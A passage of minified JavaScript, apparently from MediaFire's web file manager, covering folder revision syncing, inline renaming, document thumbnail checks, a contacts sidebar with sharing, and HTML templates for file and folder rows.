r=window.tH.currentFolder;(f=window.tH.currentFolder.revision_number&&window.tH.currentFolder.revision_number>0?r.revision_number:localStorage&&localStorage["REVISION_NUM-"+window.tH.currentFolder.folderkey]?parseInt(localStorage["REVISION_NUM-"+window.tH.currentFolder.folderkey]):0)<=0&&(f=window.tH.bhn?window.tH.bhn:localStorage&&localStorage.DEVICE_REVISION?localStorage.DEVICE_REVISION:0);var i,s,l,d,c=!1;if(o||void 0===bhF[window.tH.currentFolder.folderkey]||bhF[window.tH.currentFolder.folderkey]!=f){bhF[window.tH.currentFolder.folderkey]=f;var f,u=window.tH.currentFolder.folderkey,p=window.tH.currentFolder.folderkey;"myfiles"===u&&(u=""),(new tH.aCa).bgS({revision:f},{success:function(e,a,o){if(e.response){var n=parseInt(e.response.device_revision,10)||0,r=window.tH.bhn||0;if(0===r&&localStorage&&localStorage["REVISION_NUM-"+p]&&(r=localStorage["REVISION_NUM-"+p]),r&&n>r)beg(),(new tH.Dv).aXn({success:function(e){MYF_WIDGET_STORAGE_calculateUsedStoragePercent(e.response.settings.used_storage_size),MYF_WIDGET_STORAGE_updateStorageDisplay()}});if(window.tH.bhn=n,localStorage&&(localStorage.DEVICE_REVISION=n),window.tH.currentFolder.folderkey===p&&"trash"!==u){if(0===f&&e.response.device_revision)return tH.currentFolder.revision_number=n,tH.folders.Yx(tH.currentFolder.folderkey,tH.currentFolder),void(localStorage&&(localStorage["REVISION_NUM-"+window.tH.currentFolder.folderkey]=e.response.device_revision));var g,y;if(e.response&&e.response.changes_list_block&&(g=parseInt(e.response.changes_list_block,10),y=0===f?g:Math.floor(f/g)*g+g),"success"===e.response.result.toLowerCase()){if(e.response.deleted){var v=e.response.deleted;if(v.folders&&v.folders.length>0)for(i=0,s=v.folders.length;i<s;i++)l=v.folders[i],parseInt(l.revision,10)>f&&tH.currentFolder.folders[l.folderkey]&&(aQO(tH.currentFolder.folders[l.folderkey]),c=!0);if(v.files&&v.files.length>0)for(i=0,s=v.files.length;i<s;i++)d=v.files[i],parseInt(d.revision,10)>f&&tH.currentFolder.files[d.quickkey]&&(aQO(tH.currentFolder.files[d.quickkey]),c=!0)}if(e.response.updated){var w=e.response.updated,b="",_="";if(w.folders&&w.folders.length>0){for(i=0,s=w.folders.length;i<s;i++)l=w.folders[i],parseInt(l.revision,10)>f&&l.parent_folderkey==u&&(b+=","+l.folderkey),tH.currentFolder.folders[l.folderkey]&&l.parent_folderkey!=u&&(aQO(tH.currentFolder.folders[l.folderkey]),c=!0);b&&tH.yJ.asi(b.substring(1),(function(e,t,a){e.response.folder_infos&&$.each(e.response.folder_infos,(function(e,t){c=m(t,!0)})),e.response.folder_info&&(c=m(e.response.folder_info,!0))}),!0)}if(w.files&&w.files.length>0){for(i=0,s=w.files.length;i<s;i++)d=w.files[i],parseInt(d.revision,10)>f&&d.parent_folderkey==u&&(_+=","+d.quickkey),tH.currentFolder.files[d.quickkey]&&d.parent_folderkey!=u&&(aQO(tH.currentFolder.files[d.quickkey]),c=!0);_&&tH.Cp.asi(_.substring(1),(function(e,t,a){e.response.file_infos&&$.each(e.response.file_infos,(function(e,t){c=h(t)})),e.response.file_info&&(c=h(e.response.file_info))}))}}if(y>=e.response.device_revision?(tH.currentFolder.revision_number=parseInt(e.response.device_revision,10),tH.folders.Yx(p,tH.currentFolder),localStorage&&(localStorage["REVISION_NUM-"+p]=e.response.device_revision)):(tH.currentFolder.revision_number=y,tH.folders.Yx(p,tH.currentFolder),localStorage&&(localStorage["REVISION_NUM-"+p]=""+y),bhD(p,t)),c)window.aLo().aIX(p)}}}},error:function(o){if(0===o.readyState||""===o.responseText)RA||(RB<(t||3)?(RB++,tH.aVJ=setTimeout((function(){FI(e,t,a)}),5e3)):(RB=0,aU("user-network-ping-failed",RA="set",3600),QS("Network Unavailable","<p>Your network connection is unavailable.</p><br><p>MediaFire requires a network connection to function properly.</p>",[["close","Close","grey"],["retry","Retry","btn secondary","FI"]])));else{RB=0,RA&&(aY("user-network-ping-failed",RA=""),baD("message_dialog_div")&&QU());var n=jQuery.parseJSON(o.responseText);n&&105===n.response.error&&(LF.ahE(),clearInterval(agb),agb=0)}}}),ajo=!1}else setTimeout((function(){delete bhF[window.tH.currentFolder.folderkey]}),1e4)}function h(e){var t=!1;return e.quickkey&&(t=!0,bgk(e)?(tH.files.Yx(e.quickkey,new tH.Cp(e)),asE(new tH.Cp(e,tH.currentFolder))):aQx("files",tH.currentFolder)?(tH.files.Yx(e.quickkey,new tH.Cp(e)),aoQ(new tH.Cp(e,tH.currentFolder))):bfV(e)),t}function m(e,t){if(e.folderkey&&"myfiles"===e.folderkey)return!1;var a=!1;return e.folderkey&&(a=!0,bgk(e)?(tH.folders.Yx(e.folderkey,new tH.yJ(e)),asN(new tH.yJ(e,tH.currentFolder),t)):aQx("folders",tH.currentFolder)?(tH.folders.Yx(e.folderkey,new tH.yJ(e)),aoQ(new tH.yJ(e,tH.currentFolder))):bfV(e),window.bfF(e)),a}}function FI(e,t,a,o,n){if(n){if("true"==aL("mfloggedoff")&&void 0!==UserLogin&&1==UserLogin)return window.localStorage&&localStorage.clear(),void(top.location="/logout.php");tH.aVJ&&(clearInterval(tH.aVJ),tH.aVJ=null),aXX()||"undefined"!=typeof aEQ||afv()||(!e&&0!=e&&window.tH.currentFolder&&(e=window.tH.currentFolder.folderkey),e&&bhD(e,t,a,o,n))}}function FF(){if("undefined"!=typeof MFUL&&void 0!==MFUL.aUploaders)for(var e=0,t=MFUL.aUploaders.length;e<t;e++)if(!0===MFUL.aUploaders[e].fF())return!0;return!1}function aTd(e,t){var a="file"==t?"filename":"name",o="#"+t+"-"+e,n=$.trim($(o).find(".updatename").val()),r=window.tH.currentFolder;if(afv()&&((r={}).folders={},r.files={},$.each(window.tH.XE,(function(e,t){void 0!==t&&t&&(t.filename?r.files[t.quickkey]=t:r.folders[t.folderkey]=t)}))),n!==r[t+"s"][e][a]&&n.split(".")[0].length>0){var i={};i["filename"==a?a:"foldername"]=n,"file"==t?LF.aal(i,e):LF.aal(i,"",e)}aTP()}function aTP(e){if(tH.Pz)e=tH.Pz;return tH.Pz=!1,$(e).find(".filename_outer a.foldername").show(),$(e).find(".filename_outer input").hide(),$(e).find(".updatename").unbind("keydown").unbind("clickoutside"),$(e).attr("draggable",!0),!1}function aTn(e,t){if(UO())"folder"==t?GH.abC.open(e,"name"):GH.aby.open(e,"name");else{var a,o,n,r,i,s="#"+t+"-"+e;tH.Pz=s,$(s).find(".filename_outer input").val($(s).find(".item-name").text()),$(s).find(".filename_outer a.foldername").hide(),$(s).find(".filename_outer input").show(),a=$(s).find("a.foldername").text(),o=document.getElementById("rename-"+e),n=Gm(a=a.trim()),r=n.length>0?n.length+1:0,i=a.length-r,o.setSelectionRange&&(o.setSelectionRange(0,i),o.focus()),$(s).attr("draggable",!1),$(s).find(".updatename").bind("keydown","esc",(function(){aTP(s)})).bind("clickoutside",(function(a){aTd(e,t)})).bind("keydown","return",(function(){aTd(e,t)}))}}function ahr(e,t,a,o){var n=o.selectedIndex,r=adv("view/"+t),i=adv(!0,"convkey",e.substr(0,4),t+n+"g.jpg"),s=adv("image"==a?"i/?"+t:"?"+t),l="",d="";"image"==a?(d='<a href="'+r+'" target="_blank"><img src="'+i+'" border="0" alt="Simple, Free Image and File Hosting at MediaFire" /></a>',l="[URL="+r+"][IMG]"+i+"[/IMG][/URL]"):(d='<a href="'+s+'" target="_blank">'+s+"</a>",l="[URL="+s+"]"+s+"[/URL]"),$("#htmlembedcode").val(d),$("#forumembedcode").val(l)}function anD(e){return aCf(e)}function aqG(){$("li.file").each((function(){$("li#file-"+$(this).data("key")).length>1&&$("li#file-"+$(this).data("key")).last().remove()}))}function aqV(){$("li.folder").each((function(){$("li#folder-"+$(this).data("key")).length>1&&$("li#folder-"+$(this).data("key")).last().remove()}))}if(window.MYF_CheckChanges=FI,"undefined"==typeof arw&&(arw=3e3),!iW)var iW=10;function aCD(e,t,a){var o,n;2===t&&($.each(aBF,(function(t,o){o==e.quickkey+"-"+a&&aBF.splice(t,1)})),2==a?(window.tH.files.memory[e.quickkey].thumb1ready=!0,void 0===window.tH.aRp&&(window.tH.aRp={}),window.tH.aRp[e.quickkey]=!0):1==a?(window.tH.files.memory[e.quickkey].thumb2ready=!0,void 0===window.tH.aRE&&(window.tH.aRE={}),window.tH.aRE[e.quickkey]=!0):0==a&&(window.tH.files.memory[e.quickkey].thumb3ready=!0,void 0===window.tH.aRK&&(window.tH.aRK={}),window.tH.aRK[e.quickkey]=!0),(o=window.tH.files.memory[e.quickkey].itemrownum)&&(n=window.tH.aca[o])&&n.quickkey==e.quickkey&&(window.tH.aca[o]=window.tH.files.memory[e.quickkey]),$.publish("document/update",[window.tH.files.memory[e.quickkey]]))}function aRF(){if(window.Worker){"undefined"==typeof aEY&&(aEY={});var e=window.tH.currentFolder.folderkey,t=Uo();if(!aEY[e+"-"+t]){var a="/js/doc_thumb_status.js";"undefined"!=typeof JS_LoadTime&&(a="/js/doc_thumb_status_"+JS_LoadTime+".js"),aEY[e+"-"+t]=new Worker(a),aEY[e+"-"+t].onmessage=function(e){switch(e.data.cmd){case"script-error":break;case"update-file":aCD(window.tH.files.yx(e.data.quickkey),e.data.status,e.data.thumbsize)}}}}}function Uo(){var e=0;return($("#myfiles_wrap").hasClass("sizeM")||"M"==aL("mfsize"))&&(e=1),($("#myfiles_wrap").hasClass("sizeS")||"S"==aL("mfsize"))&&(e=2),e}var aBF=[];function aCs(e,t){function a(e){void 0===e.docCheckCount?e.docCheckCount=0:e.docCheckCount++,e.docCheckCount<iW?setTimeout((function(){$("#myfiles_wrap").hasClass("thumbnailView")&&(e.doc_status_check=!1,aCs(e,!0))}),arw):aCD(e,32768)}var o,n,r;(function(e){return aQu||(aQu=52428800),e.size>aQu})(e)||aCz(e)&&e.quickkey&&(o=e,n=!1,r=Uo(),$.each(aBF,(function(e,t){t==o.quickkey+"-"+r&&(n=!0)})),n||aBF.push(o.quickkey+"-"+r),(!n||t)&&(e.hash&&""!=e.hash?function(e){"undefined"==typeof aEY&&(aEY={}),aRF();var t=Uo();if(aEY[e.parent.folderkey+"-"+t]&&!e.doc_status_check){var o={quickkey:e.quickkey,hash:e.hash,thumbsize:Uo(),url:aBM(e.quickkey,e.hash,!0,Uo()),maxchecks:iW};e.doc_status_check=!0,window.tH.files.Yx(e.quickkey,e),aEY[e.parent.folderkey+"-"+t].postMessage({cmd:"check-status",file:o})}else if($.browser.msie&&window.XDomainRequest&&!e.doc_status_check){var n=Uo(),r=new XDomainRequest;r.open("get",aBM(e.quickkey,e.hash,!0,n)),r.onload=function(){n=Uo();var t=$.parseJSON(r.responseText);"COMPLETE"==t.page_status?aCD(e,2,n):"ERROR"==t.document_status||"ERROR"==t.page_status?aCD(e,32768,n):a(e)},r.onerror=function(){a(e)},e.doc_status_check=!0,window.tH.files.Yx(e.quickkey,e),setTimeout((function(){r.send()}),0)}else n=0,$("#myfiles_wrap").hasClass("sizeM")&&(n=1),$("#myfiles_wrap").hasClass("sizeS")&&(n=2),aCD(e,2,n)}(e):function(e){var t=new window.tH.Cp(e.quickkey);t.Yw((function(){aCs(t)}))}(e)))}function aRX(e){return!!window.tH.Cp.Zo(e)&&(e.parent.folderkey==window.tH.currentFolder.folderkey&&(!(!UO()&&"on"!=aL("thumbview"))&&(!("image"==e.filetype||!aCf(e))&&((!$("#myfiles_wrap").hasClass("sizeS")||!(e.thumb1ready||window.tH.aRp&&window.tH.aRp[e.quickkey]))&&((!$("#myfiles_wrap").hasClass("sizeM")||!(e.thumb2ready||window.tH.aRE&&window.tH.aRE[e.quickkey]))&&(!$("#myfiles_wrap").hasClass("sizeL")||!(e.thumb3ready||window.tH.aRK&&window.tH.aRK[e.quickkey])))))))}function aCz(e){return"document"==e.filetype||"spreadsheet"==e.filetype||"presentation"==e.filetype}function aFi(){if(window.tH.aFA)return!0}function aCf(e){return!(!e.flag||1!=avH(e.flag,2))&&(e.filetype&&"image"===e.filetype)}function aGe(e){return!(!e.flag||1!=avH(e.flag,4))&&(e.mimetype&&"text/rtf"!==e.mimetype&&0===e.mimetype.indexOf("text/"))}function aTB(e){return e.flag&&1==avH(e.flag,1)}function aEh(){$("#contactViewToggle").show().click((function(){return aCV(),!1})),aDf()}function aCV(){return"undefined"==typeof aBa&&(aBa=!1),!0===aBa||(aBa=!0,0==parseInt($("#contactSidebar").css("right"))?($("#contactViewToggle").removeClass("cvtActive"),$("#contactSidebar").animate({right:-160},{complete:function(){aBa=!1}})):($("#contactViewToggle").addClass("cvtActive"),$("#contactSidebar").animate({right:0},{complete:function(){aBa=!1}}))),!1}function aDo(){var e=[{text:"Delete Contact",command:"delete-contact",type:"contact"},{text:"Edit Contact",command:"edit-contact",type:"contact"},{text:"Add to Group",command:"add-to-group",type:"contact"},{text:"View Share Log",command:"share-log",type:"contact"},{text:"Clear Notifications",command:"clear-notices",type:"contact"},{text:"Remove Group",command:"remove-group",type:"group"},{text:"Edit Group",command:"edit-group",type:"group"}],t='<div id="contact_contextmenu" class="dropdown" style="position:absolute">';$.each(e,(function(a,o){0!=a&&e[a-1].type==o.type||(t+='<ul id="contextmenu-contactlist-'+o.type+'">'),t+='<li data-command="'+o.command+'">'+o.text+"</li>",a!=e.length-1&&e[a+1].type==o.type||(t+="</ul>")})),t+="</div>",$("body").append($(t))}function aDE(){$("#contactSidebar ul#contactList li").bind({draghover:function(e){$(this).toggleClass("contactHighlight",e.enter),aeV(e)},drop:function(e){var t;if((!e.originalEvent.dataTransfer.files||0==e.originalEvent.dataTransfer.files.length)&&(t=JSON.parse(e.originalEvent.dataTransfer.getData("Text")))){if(t.files||t.folders){var a=$(this).data("contactid"),o=[];if(t.folders&&$.each(t.folders.split(),(function(e,t){t&&""!=t&&"NOKEY"!=t&&o.push(t)})),t.files&&$.each(t.files.split(),(function(e,t){t&&""!=t&&"NOKEY"!=t&&o.push(t)})),0==o.length)return Zi(0,"Unable to share this item due to an invalid folder/file."),$(this).removeClass("contactHighlight"),aeV(e),!1;aDI(o.join(),a)}return $(this).removeClass("contactHighlight"),aeV(e),!1}},click:function(){var e=$(this).data("contactid");Zi(0,"You clicked on "+window.tH.userinfo.contacts["contact-"+e].contact_name+". Unfortunately, this feature is not currently available.")},contextmenu:function(e){var t;return"contact",t=$(this).attr("data-contactid"),window.aEN||(window.aEN=new aEk),aEN.open("contactlist","contact",aiH(e,-2,-2),t),aeV(e),!1}}),$("#contactSidebar ul#groupList li").bind({draghover:function(e){$(this).toggleClass("contactHighlight",e.enter),aeV(e)},drop:function(e){var t;if((!e.originalEvent.dataTransfer.files||0==e.originalEvent.dataTransfer.files.length)&&(t=JSON.parse(e.originalEvent.dataTransfer.getData("Text"))))return(t.files||t.folders)&&Zi(0,"Sharing to contact groups is not available, yet."),$(this).removeClass("contactHighlight"),aeV(e),!1},click:function(){var e=$(this).data("contactid");Zi(0,"You clicked on "+window.tH.userinfo.contacts["contact-"+e].contact_name+". Unfortunately, this feature is not currently available.")},contextmenu:function(e){var t;return"group",t=$(this).attr("data-id"),window.aEN||(window.aEN=new aEk),aEN.open("contactlist","group",aiH(e,-2,-2),t),aeV(e),!1}})}function aEk(){var e=$("#contact_contextmenu");function t(t,o,n,r){if(a(),"contact"==o)aCT(r);$(["#contextmenu",t,o].join("-")).show().closest(".dropdown").data("context",r);$(["#contextmenu",t,o].join("-")).trigger("CTC_BeforeOpen"),e.show().css(n),$(["#contextmenu",t,o].join("-")).trigger("CTC_AfterOpen")}function a(){e.hide().children("ul").hide().removeData("context"),$(".row_context").removeClass("row_context"),e.removeClass("fixed")}function o(e){var t=parseInt(e.parent().css("top")),a=parseInt(e.parent().css("left"));e.height()+t-$(window).scrollTop()>$(window).height()&&t-e.height()>=0&&e.parent().css("top",t-e.height()+4),e.width()+a>$(window).width()&&a-e.width()>=0&&e.parent().css("left",a-e.width()+4),e.parent().hasClass("fixed")&&e.parent().css("top",parseInt(e.parent().css("top"))-parseInt($(window).scrollTop()))}function n(e){var t=parseInt(e.parent().parent().parent().css("top"))+100,a=parseInt(e.parent().parent().parent().css("left"))+100;80+t-$(window).scrollTop()>$(window).height()&&t-e.height()>=0?e.css("top",-45):e.css("top",0),205+a>$(window).width()&&a-205>=0?e.css("left","55%"):e.css("left","100%")}return e.bind("clickoutside",a),$("#contextmenu-contactlist-contact").bind("CTC_BeforeOpen",(function(){var e=$(this).closest(".dropdown").data("context");aCT(e);$("#contact-"+e).addClass("row_context")})).bind("CTC_AfterOpen",(function(){var e=$(this),t=aCT(e.closest(".dropdown").data("context"));if(o(e),!t)return!1})).delegate("li[data-command]","click",(function(e){var t=$(this);t.data("command"),t.closest(".dropdown").data("context");Zi(0,"The '"+t.text()+"' command has not yet been enabled. Please check back again later."),a(),aeV(e)})).delegate(".dropdown li.submenu","mouseenter",(function(e){n(em),aeV(e)})).delegate(".dropdown li.submenu","mouseleave",(function(e){aeV(e)})),$("#contextmenu-contactlist-group").bind("CTC_BeforeOpen",(function(){var e=$(this).closest(".dropdown").data("context");aCT(e);$("#contact-"+e).addClass("row_context")})).bind("CTC_AfterOpen",(function(){var e=$(this),t=aCT(e.closest(".dropdown").data("context"));if(o(e),!t)return!1})).delegate("li[data-command]","click",(function(e){var t=$(this);t.data("command"),t.closest(".dropdown").data("context");Zi(0,"The '"+t.text()+"' command has not yet been enabled. Please check back again later."),a(),aeV(e)})).delegate(".dropdown li.submenu","mouseenter",(function(e){n(em),aeV(e)})).delegate(".dropdown li.submenu","mouseleave",(function(e){aeV(e)})),{open:t,CD:function(){e.is(":visible")?aoh():t.apply(null,arguments)},aDa:a}}function aCT(e){return!!window.tH.userinfo.contacts["contact-"+e]&&window.tH.userinfo.contacts["contact-"+e]}function aDI(e,t){var a=window.tH.userinfo.contacts["contact-"+t],o=e.split().length,n={success:function(e){Zi(0,1==o?"You've successfully shared "+o+" file/folder with "+a.contact_name:"You've successfully shared "+o+" files/folders with "+a.contact_name),$.publish("selection/deselectall")},error:function(e){Zi(0,1==o?"Sorry. An error ocurred. We can't share this item at this time":"Sorry. An error ocurred. We can't share these items at this time"),$.publish("selection/deselectall")}};new window.tH.aCa(window.aCQ||0).hH({data:{resources:e,contacts:t}},n)}function aCy(){var e=$(window).height()-89-28,t=$(document).height()-$(window).scrollTop()-$("#footer").height();t<$(window).height()&&(e=t-89-28),$("#contactSidebar").height(e)}function aDC(){$(window).bind("resize scroll",(function(){aCy()})),$.subscribe("folder/render",(function(){aCy()}))}function aBy(){return!(!window.tH.userinfo||!window.tH.userinfo.contacts)}function aDf(){var e="";$.each([{text:"Add Contacts",command:"add-contact"},{text:"Import Contacts",command:"import-contacts"}],(function(t,a){e+="<li data-command='"+a.command+"'>"+a.text+"</li>"})),$("#contactSettings ul").html(e),$("#contactSidebar").find(".dropdown").dropdown({command:function(e,t){switch(e){case"add-contact":aDS();break;case"import-contacts":aDY()}}})}function aDY(){if(0==$("#import-contacts").length){var e=window.tmpl("pop_import_contacts")();$("#popup-section").append($(e))}window.aDy||(window.aDy=new aEI),window.aDy.open()}function aEI(){var e=$("#import-contacts").popup(),t=e.data("popup");return e.delegate(".close","click",(function(e){t.close()})),e.delegate("#add_contact_mediafire .confirm","click",(function(e){return!1})),e.delegate(".tabs li[data-tab]","click",(function(e){aij("#share_socialnetworks_message","#sharebox-social .share-facebook .remaining",$("#fb_share_checkbox").data("input-length"),!0,(function(){return $("#fb_share_checkbox").is(":checked")})),aij("#share_socialnetworks_message","#sharebox-social .share-twitter .remaining",$("#tw_share_checkbox").data("input-length"),!0,(function(){return $("#tw_share_checkbox").is(":checked")})),aij("#email_files_message","#sharebox-email .remaining",128,!0),aeV(e)})),{open:function(){$('div[id^="MediaFireUploaderSWFDiv"]').hide(),t.open()},popup:t,close:t.close}}function aDS(){if(0==$("#add-contact").length){var e=window.tmpl("pop_new_contact")();$("#popup-section").append($(e))}window.aDp||(window.aDp=new aDe),window.aDp.open()}function aDe(){var e=$("#add-contact").popup(),t=e.data("popup");return e.delegate(".close","click",(function(e){t.close()})),e.delegate("#add_contact_mediafire .confirm","click",(function(e){var t=new window.tH.aBS,a=$("#details-contact-email").val();t.ZD({data:{contact_type:"mediafire",mediafire_email:a}},{success:function(e){},error:function(e){}})})),{open:function(){$('div[id^="MediaFireUploaderSWFDiv"]').hide(),t.open()},popup:t,close:t.close}}function aDP(){if(aBy()){var e=0;$.each(window.tH.userinfo.contacts,(function(t,a){a.mediafire&&e++})),e>1?$('#groupList li[data-id="mf"]').find(".groupNumbers").text(e+" Contacts"):1==e&&$('#groupList li[data-id="mf"]').find(".groupNumbers").text(e+" Contact")}}function aEe(){aDR()&&($.each(window.tH.userinfo.notifications,(function(e,t){aBy()&&t.sender&&t.sender.email&&$.each(window.tH.userinfo.contacts,(function(e,a){a.mediafire&&a.mediafire.email&&a.mediafire.email==t.sender.email&&aCY(t,a)}))})),aEE())}function aDR(){return!(!window.tH.userinfo||!window.tH.userinfo.notifications)}function aCY(e,t){if(e&&t){t.notices||(t.notices=[]);var a=!1;$.each(t.notices,(function(t,o){o.id==e.id&&(a=!0)})),0==a&&t.notices.push(e)}}function aEE(){aBy()&&$("#contactList li").each((function(){var e=$(this).data("contactid"),t=window.tH.userinfo.contacts["contact-"+e];t.notices&&t.notices.length>0?($(this).find(".contactNotices").text(t.notices.length),$(this).addClass("hasNotices")):$(this).removeClass("hasNotices")}))}function aBU(e){if(e)if(void 0===e.index&&e.folders&&e.folders.length>0)$.each(e.folders,(function(e,t){aBU(t)}));else{var t="";e.folders&&$.each(e.folders,(function(e,a){t+=aEF(a)})),e.files&&$.each(e.files,(function(e,a){t+=aEl(a)})),$("ol#main_list").html(t),window.aDO||(window.aDO={}),window.aDO=e,aEm(e),aEC()}}function aEC(){$("ol#main_list.device li.folder .filename_outer a, ol#main_list.device li.folder .filetype_column a").unbind("click"),$("ol#main_list.device li.folder .filename_outer a, ol#main_list.device li.folder .filetype_column a").bind("click",(function(e){return aDq($(this).closest("li").data("index")),aeV(e),!1}))}function aCZ(){return'<li id="file-#QUICKKEY#" draggable="true" data-key="#QUICKKEY#" data-index="#FILE_INDEX#" class="row_container mf_filecontainer file #FILETYPE#  public row_context"><div class="grip_column"><div class="checkbox-custom" title="Select/Deselect Item"></div><img class="dragfile_icon" width="30" height="45" src="/images/icons/1x1_transparent.gif" border="0"></div><div class="filetype_column"><a href="/download.php?#QUICKKEY#" onclick="window.MYF_DirectDownload({files: \'#QUICKKEY#\'}); return false;"><span class="filetype-#FILETYPE#"></span></a></div><div class="btns_column"><div></div><div><a href="javascript:void(0);" class="fileoptions btn secondary" title="Open actions menu"><span class="ico16 gear"></span></a></div><div><a href="#FILEURL#" target="_blank" class="previewBtn showonhover btn secondary" title="Preview"><span class="ico16 previewBtn"></span></a></div><div>    <a href="javascript:void(0);" class="download btn secondary" title="Download"><span class="ico16 download"></span></a></div><div class="sharebtn-wrap"><a href="javascript:void(0);" class="share btn secondary" title="Share"><span class="ico16 users"></span></a></div><div class="imgpreviewonly"><a href="javascript:void(0);" class="imgopenpreview btn secondary" title="Open image preview"><span class="ico16 zoom-in"></span></a></div></div><div class="info"><div class="filename_outer"><a class="foldername" href="#FILEURL#" onclick="">#FILENAME#</a><div class="private-label">Private</div><div class="password-protected-label">Password</div></div><div class="file_maindetails_outer cf"><span class="file_maindetails"><span>#CREATED_TIME#,</span> #FILESIZE#</span><span class="statusicons"><span class="private"><a href="javascript:void(0);" title="File is private. Click here to add this file to your public gallery pages."><span class="ico16 lock"></span></a></span><span class="public"><a href="javascript:void(0);" title="File is public. Click here to hide this file from your public gallery pages."><span class="ico16 unlock"></span></a></span><span class="password"><a href="javascript:void(0);" title="This file is currently password protected. Click to remove."><span class="ico16 security"></span></a></span></span></div></div><div class="infobox_lg tooltip point-left"><span class="infobox-fileicon filetype-#FILETYPE#"></span><h4>#FILENAME#<span class="infobox-stats">Added: #CREATED_TIME#, #FILESIZE#</span></h4></div><div style="clear: both;"></div></li>'}function aDT(){return'<li id="folder-#FOLDER_KEY#" draggable="true" data-key="#FOLDER_KEY#" data-index="#FOLDER_INDEX#" class="row_container mf_filecontainer folder public cf" linked=""><div class="grip_column"><div class="checkbox-custom" title="Select/Deselect Item"></div><img class="dragfile_icon" width="30" height="45" src="/images/icons/1x1_transparent.gif" border="0"></div><div class="filetype_column"><a href="##FOLDER_KEY#"><span class="filetype-folder"></span></a></div><div class="btns_column"><div><a href="javascript:void(0);" class="fileoptions btn secondary" title="Open actions menu"><span class="ico16 gear"></span></a></div><div><a href="javascript:void(0);" class="download btn secondary" title="Download"><span class="ico16 download"></span></a></div><div class="sharebtn-wrap"><a href="javascript:void(0);" class="share btn secondary" title="Share"><span class="ico16 users"></span></a></div></div><div class="info cf"><div class="filename_outer"><a class="foldername" href="##FOLDER_KEY#">#FOLDER_NAME#</a><div class="private-label">Private</div></div><div class="file_maindetails_outer cf"><span class="file_maindetails">#CREATED_TIME##FOLDERS_NUM# Folders, #FILES_NUM# Files</span><span class="statusicons"><span class="dropbox" id="dropbox-icon-wzm927w9jax63"><a href="javascript:void(0);" title="This folder is a FileDrop. Click to edit FileDrop settings" onclick="zW(\'#FOLDER_KEY#\'); return false;"><span class="ico16 dropbox"></span></a></span><span class="private"><a href="javascript:void(0);" title="File is private. Click here to add this file to your public gallery pages."><span class="ico16 lock"></span></a></span><span class="public"><a href="javascript:void(0);" title="File is public. Click here to hide this file from your public gallery pages."><span class="ico16 unlock"></span></a></span></span></div></div><div class="infobox_lg tooltip point-left"><span class="infobox-fileicon filetype-folder"></span><h4>#FOLDER_NAME#<span class="infobox-stats">#CREATED_TIME#, #FOLDERS_NUM# Folders, #FILES_NUM# Files</span></h4></div><div style="clear: both;"></div></li>'}function aEl(e){var t=aCZ(),a="/download.php?"+e.quickkey;return(aCf(e.name)&&"image"==e.filetype||aCf(e.name))&&(a="/view/"+e.quickkey),t=(t=(t=(t=(t=(t=(t=t.replace(RegExp("#FILEURL#","gi"),a)).replace(RegExp("#FILE_INDEX#","gi"),e.index)).replace(RegExp("#QUICKKEY#","gi"),e.quickkey)).replace(RegExp("#FILENAME#","gi"),e.name)).replace(RegExp("#CREATED_TIME#","gi"),e.added)).replace(RegExp("#FILESIZE#","gi"),formatBytes(e.size))).replace(RegExp("#FILETYPE#","gi"),e.filetype)}function aEF(e){var t=aDT();return t=(t=(t=(t=(t=(t=t.replace(RegExp("#FOLDER_INDEX#","gi"),e.index)).replace(RegExp("#FOLDER_KEY#","gi"),e.folderkey||"NOKEY")).replace(RegExp("#FOLDER_NAME#","gi"),e.name)).replace(RegExp("#CREATED_TIME#","gi"),e.added?e.added+", ":"")).replace(RegExp("#FOLDERS_NUM#","gi"),e.folders&&e.folders.length||0)).replace(RegExp("#FILES_NUM#","gi"),e.files&&e.files.length||0)}function aDq(e){return aBU(aEA(e)),!1}function aEA(e){return window.tH.userinfo.devices["device-"+window.aCQ].allfolders[e]}function aDJ(){return!!(window.tH.userinfo&&window.tH.userinfo.devices&&window.tH.userinfo.devices["device-"+window.aCQ]&&window.tH.userinfo.devices["device-"+window.aCQ].content)}function aEu(){if(aDJ()){var e="";$.each(window.tH.userinfo.devices["device-"+window.aCQ].content.folders,(function(t,a){e+=aBg(a)})),$(".folderlist_content ul.device").html(e),setTimeout((function(){$(window).resize()}),100),aDw()}}function aBg(e){var t="";return void 0===e.index&&e.folders&&e.folders.length>0?($.each(e.folders,(function(e,a){t+=aBg(a)})),t):(t+="<li id='nav-"+e.index+"' class='collapsed' data-folderkey='"+e.folderkey+"' data-index='"+e.index+"'>",e.folders&&e.folders.length>0&&(t+="<a class='folder_arrow' href='#'></a>"),t+="<a href='javascript:void(0)' class='folder_name'>"+e.name+"</a>",e.folders&&e.folders.length>0&&(t+="<ul>",$.each(e.folders,(function(e,a){t+=aBg(a,!1)})),t+="</ul>"),t+="</li>")}function aDw(){$(".folderlist_content ul.device li, .folderlist_content ul.device li a.folder_arrow").unbind("click"),$(".folderlist_content ul.device li").bind("click",(function(){return aDq($(this).data("index")),!1})),$(".folderlist_content ul.device li a.folder_arrow").bind("click",(function(){return $(this).parent().hasClass("collapsed")?$(this).parent().removeClass("collapsed").addClass("expanded"):$(this).parent().removeClass("expanded").addClass("collapsed"),!1}))}function aEm(e,t){$(".folderlist_content ul.device li").removeClass("expanded current_folder_location").addClass("collapsed"),$(".folderlist_content ul.device li#nav-"+e.index).removeClass("collapsed").addClass("expanded current_folder_location").parents("li").addClass("expanded")}function aUi(e){if(!e.folderkey||!tH.aHp||tH.aHp[e.folderkey])return!1;tH.aHp[e.folderkey]=e,Xb.amr(e)}function aHJ(e,t){var a=function(){};e>100&&(e=100),e<0&&(e=0),0!=e&&t||(t=0),100==e&&(clearTimeout(window.aHS),window.aHS=null,a=function(){$("#container").removeClass("mfloading")},t=250),$("#mfload_progress_bar").stop().animate({width:Math.ceil(e)+"%"},t,a)}function fileSizeToString(e,t,a){var o=["B","KB","MB","GB","TB","PB"],n=(e/Math.pow(1024,Math.floor(Math.log(e)/Math.log(1024)))).toFixed(t),r=a?" ":"";return isNaN(n)||0==n?"0"+r+o[0]:n+r+o[Math.floor(Math.log(e)/Math.log(1024))]}function 